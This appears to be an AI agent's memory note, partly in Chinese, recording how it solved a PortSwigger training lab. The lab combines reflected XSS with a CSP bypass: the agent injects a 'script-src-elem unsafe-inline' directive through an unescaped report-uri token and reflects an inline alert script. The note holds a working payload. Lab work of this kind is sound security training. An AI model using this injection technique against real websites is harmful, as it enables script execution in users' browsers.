---
metadata:
  node_type: memory
name: "PRS arm A lab-csp-bypass"
description: "arm A 基线:lab-csp-bypass 冷实例一次通过 - token 拼进 CSP report-uri,追加 ;script-src-elem 'unsafe-inline' 后内联 script 反射即执行,banner solved"
last_updated: 2026-10-09T01:29:57+08:00
created: 2026-10-09T01:29:57+08:00
---

- 题:lab-csp-bypass(reflected XSS + CSP 绕过),arm A 冷实例一次通过。
- 实例获取:range_launch 两次都拿不到实例(见「PortSwigger lab launch and transport quirks」);改用 http_session 直接 follow 启动链取到实例根。
- 实例:0abf003204e336a581ac99bb00020047.web-security-academy.net(jar /tmp/cj1.json)。
- 发现:响应头 `content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=`;token 查询参数原样拼在 token= 之后,故追加 `;script-src-elem 'unsafe-inline'` 即放行内联脚本。
- 反射点:`<h1>0 search results for '<search>'</h1>`,HTML 体无编码,`<` 原样保留。
- 载荷:`?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'` ⇒ page_alert fired=true(alert:1),banner solved=true。

